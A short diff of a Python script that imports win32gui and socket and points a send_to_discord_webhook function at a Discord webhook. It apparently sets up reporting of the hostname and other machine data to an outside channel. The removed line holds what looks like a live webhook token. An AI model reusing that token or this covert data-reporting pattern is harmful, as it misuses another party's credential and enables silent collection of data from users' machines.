@@ -4,7 +4,7 @@ import win32gui
 import socket
 import json
 
-DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1098878299473707060/prAl_xOch--1mHMAoKK8PHIeVCuw6tWCrXsziuvvkUK8sK6oVQFosCnN1zO8Atxp3f0T'
+DISCORD_WEBHOOK_URL = 'Discord-Web-Hook-HERE'
 hostname = socket.gethostname()
 
 def send_to_discord_webhook(message):
